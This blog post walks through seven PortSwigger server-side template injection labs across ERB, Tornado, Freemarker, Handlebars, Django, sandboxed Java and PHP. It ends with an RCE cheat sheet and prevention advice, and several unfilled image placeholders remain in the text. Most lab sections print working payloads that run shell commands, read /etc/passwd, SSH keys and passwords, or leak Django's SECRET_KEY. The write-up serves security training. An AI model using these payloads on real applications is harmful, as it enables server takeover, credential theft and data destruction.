---
title: "PortSwigger SSTI Labs — Complete Walkthrough"
date: 2026-09-22 08:20:00 +0000
categories: [Web Penetration Testing]
tags: [SSTI, PortSwigger, Web Security Academy, RCE]
description: "All 7 PortSwigger server-side template injection labs: ERB, Tornado, Freemarker, Handlebars, Django, a sandboxed environment and a custom PHP exploit."
author: Paschal Sangawe
toc: true
---

Server-side template injection (SSTI) occurs when user input is embedded into a template and evaluated by the template engine. It is essentially code injection: once you control template syntax, you can often reach the underlying language runtime and achieve **remote code execution**. SSTI is frequently reachable through features that look harmless — an "out of stock" message, a preferred-name field, or a CMS template editor.

This post covers all **7 PortSwigger SSTI labs**, one per engine or scenario. The key skill is **fingerprinting the engine** from the syntax, then using its documented dangerous features.

{% raw %}

## Background — fingerprinting the engine

Inject a fuzz string that mixes syntaxes and watch which one is evaluated or errors:

```text
${{<%[%'"}}%\
```

Rough engine map:

| Syntax | Likely engine |
|--------|---------------|
| `<%= expr %>` | ERB (Ruby) |
| `{{ expr }}` / `{% code %}` | Jinja2, Twig, Tornado, Nunjucks |
| `${expr}` / `<#...>` | Freemarker (Java) |
| `{{#with ...}}` | Handlebars (Node) |
| `{{settings.X}}` | Django (Python) |

A mathematical probe like `{{7*7}}` rendering `49` (not the literal string) confirms evaluation.

## Lab 1 — Basic server-side template injection
> **Picture goes here (#1).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `<%= 7*7 %>`.
> _Save as_ `images/portswigger-ssti-labs/1.png` _then replace this block with_ `![Lab 1 — Basic server-side template injection](/images/portswigger-ssti-labs/1.png)`_._


**Difficulty:** Practitioner
**Engine:** ERB (Ruby)
**Goal:** Delete `/home/carlos/morale.txt`.

A `message` parameter is rendered into an ERB template. Probe with a math expression:

```text
<%= 7*7 %>
```

URL-encoded:

```text
?message=<%25%3d+7*7+%25>
```

The page renders `49`, confirming SSTI. Ruby's `system()` executes OS commands, so inject:

```text
<%= system("rm /home/carlos/morale.txt") %>
```

> **Picture goes here (#2).** The `49` probe, then the `system()` payload solving the lab.
> _Save as_ `images/portswigger-ssti-labs/2.png` _then replace this block with_ `![Lab 1 — Basic server-side template injection](/images/portswigger-ssti-labs/2.png)`_._

## Lab 2 — Basic SSTI (code context)
> **Picture goes here (#3).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `blog-post-author-display=user.name}}{{7*7}}`.
> _Save as_ `images/portswigger-ssti-labs/3.png` _then replace this block with_ `![Lab 2 — Basic SSTI (code context)](/images/portswigger-ssti-labs/3.png)`_._


**Difficulty:** Practitioner
**Engine:** Tornado (Python)
**Goal:** Delete Carlos's morale file.

The `blog-post-author-display` parameter is placed **inside** an existing expression (`{{user.name}}`), so we must break out of it first.

1. Probe by appending `}}`:

```text
blog-post-author-display=user.name}}{{7*7}}
```

The comment now shows `Peter Wiener49}}` — confirming code-context SSTI.
2. Tornado executes Python in `{% %}`:

```text
blog-post-author-display=user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')
```

3. Reload the comment to execute.

> **Picture goes here (#4).** `Peter Wiener49}}` proof, then the `os.system` payload.
> _Save as_ `images/portswigger-ssti-labs/4.png` _then replace this block with_ `![Lab 2 — Basic SSTI (code context)](/images/portswigger-ssti-labs/4.png)`_._

## Lab 3 — SSTI using documentation
> **Picture goes here (#5).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt`.
> _Save as_ `images/portswigger-ssti-labs/5.png` _then replace this block with_ `![Lab 3 — SSTI using documentation](/images/portswigger-ssti-labs/5.png)`_._


**Difficulty:** Practitioner
**Engine:** Freemarker (Java)
**Goal:** Execute a shell command.

Editing a product template with `${foobar}` reveals Freemarker. Its documentation warns that the `new()` built-in can instantiate arbitrary Java objects, including `freemarker.template.utility.Execute`:

```text
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
```

Save the template and view the product page.

> **Picture goes here (#6).** The `Execute` built-in payload in the template editor.
> _Save as_ `images/portswigger-ssti-labs/6.png` _then replace this block with_ `![Lab 3 — SSTI using documentation](/images/portswigger-ssti-labs/6.png)`_._

## Lab 4 — SSTI in an unknown language with a documented exploit
> **Picture goes here (#7).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `wrtz{{#with "s" as |string|}}`.
> _Save as_ `images/portswigger-ssti-labs/7.png` _then replace this block with_ `![Lab 4 — SSTI in an unknown language with a documented exploit](/images/portswigger-ssti-labs/7.png)`_._


**Difficulty:** Practitioner
**Engine:** Handlebars (Node.js)
**Goal:** Execute `child_process.exec`.

The fuzz string errors in a way that identifies **Handlebars**. The well-known public exploit (by @Zombiehelp54) reaches `require` and executes code. Adapt it to delete Carlos's file:

```text
wrtz{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

URL-encode it as the `message` parameter and load the page.

> **Picture goes here (#8).** The Handlebars prototype-walk exploit in the URL and the lab solving.
> _Save as_ `images/portswigger-ssti-labs/8.png` _then replace this block with_ `![Lab 4 — SSTI in an unknown language with a documented exploit](/images/portswigger-ssti-labs/8.png)`_._

## Lab 5 — SSTI with information disclosure via user-supplied objects
> **Picture goes here (#9).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `{% debug %}`.
> _Save as_ `images/portswigger-ssti-labs/9.png` _then replace this block with_ `![Lab 5 — SSTI with information disclosure via user-supplied objects](/images/portswigger-ssti-labs/9.png)`_._


**Difficulty:** Practitioner
**Engine:** Django (Python)
**Goal:** Leak the framework `SECRET_KEY`.

1. An invalid expression in a template reveals **Django**.
2. Invoke the debug tag to dump accessible objects:

```text
{% debug %}
```

3. The output shows you can reach the `settings` object.
4. Read the secret key:

```text
{{settings.SECRET_KEY}}
```

5. Save the template and submit the key.

> **Picture goes here (#10).** `{% debug %}` output listing `settings`, then the leaked `SECRET_KEY`.
> _Save as_ `images/portswigger-ssti-labs/10.png` _then replace this block with_ `![Lab 5 — SSTI with information disclosure via user-supplied objects](/images/portswigger-ssti-labs/10.png)`_._

## Lab 6 — SSTI in a sandboxed environment
> **Picture goes here (#11).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('`.
> _Save as_ `images/portswigger-ssti-labs/11.png` _then replace this block with_ `![Lab 6 — SSTI in a sandboxed environment](/images/portswigger-ssti-labs/11.png)`_._


**Difficulty:** Expert
**Engine:** Java (sandboxed)
**Goal:** Read `/home/carlos/my_password.txt`.

The template engine restricts dangerous classes but exposes a `product` object. Use Java reflection to walk from `product` to a class loader that can read a file:

```text
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

The output is the file contents as decimal ASCII bytes. Convert them back to text and submit the password.

> **Picture goes here (#12).** The reflection chain returning byte values, and the decoded password.
> _Save as_ `images/portswigger-ssti-labs/12.png` _then replace this block with_ `![Lab 6 — SSTI in a sandboxed environment](/images/portswigger-ssti-labs/12.png)`_._

## Lab 7 — SSTI with a custom exploit
> **Picture goes here (#13).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `user.setAvatar('/etc/passwd','image/jpg')`.
> _Save as_ `images/portswigger-ssti-labs/13.png` _then replace this block with_ `![Lab 7 — SSTI with a custom exploit](/images/portswigger-ssti-labs/13.png)`_._


**Difficulty:** Expert
**Engine:** PHP (custom object)
**Goal:** Delete Carlos's SSH key via a custom method.

The preferred-name field is SSTI-vulnerable and you have access to a `user` object with a custom `setAvatar()` method.

1. An invalid avatar upload error leaks `user.setAvatar()` and the path `/home/carlos/User.php`.
2. Set an arbitrary file as your avatar through the template:

```text
user.setAvatar('/etc/passwd','image/jpg')
```

3. Load `GET /avatar?avatar=wiener` to read the file — confirming arbitrary file read.
4. Read the custom class to discover `gdprDelete()`:

```text
user.setAvatar('/home/carlos/User.php','image/jpg')
```

5. Set Carlos's private key as the avatar, then invoke the delete method:

```text
user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
```

then:

```text
user.gdprDelete()
```

> **Picture goes here (#14).** Reading `/etc/passwd` via the avatar, then invoking `gdprDelete()`.
> _Save as_ `images/portswigger-ssti-labs/14.png` _then replace this block with_ `![Lab 7 — SSTI with a custom exploit](/images/portswigger-ssti-labs/14.png)`_._

## SSTI cheat sheet

| Engine | Detection | RCE primitive |
|--------|-----------|---------------|
| ERB (Ruby) | `<%= 7*7 %>` → 49 | `<%= system("cmd") %>` |
| Tornado (Py) | `{{7*7}}` → 49 | `{% import os %}{{os.system('cmd')}}` |
| Freemarker (Java) | `${7*7}` | `<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("cmd")}` |
| Handlebars (Node) | `{{7*7}}` | constructor/prototype walk → `require('child_process')` |
| Django (Py) | `{{7*7}}` | `{% debug %}` → `{{settings.SECRET_KEY}}` |
| Java sandbox | object available | reflection → `getCodeSource()` → `openStream()` |
| Twig (PHP) | `{{7*7}}` | `{{_self.env.registerUndefinedFilterCallback('system')}}` etc. |

## Prevention

- **Never** concatenate user input into templates. Pass it as **data** to a fixed template (`render(template, data)`), not as template source.
- Prefer **logic-less** templates and keep template source out of user reach.
- If users may edit templates (CMS), sandbox the engine, run it with **least privilege**, and allow-list tags/filters/functions.
- Do not expose dangerous built-ins (`new()`, reflection helpers) and strip/validate template syntax in user data.
- Apply defence in depth: disable `system`/`exec`, restrict filesystem access, and monitor for template errors.

## Related posts

- [OS Command Injection labs](/posts/portswigger-os-command-injection-labs/)
- [JWT labs](/posts/portswigger-jwt-labs/)
- [GraphQL labs](/posts/portswigger-graphql-labs/)
- [SQL Injection lab series](/posts/portswigger-sqli-part-1-basics/)

{% endraw %}
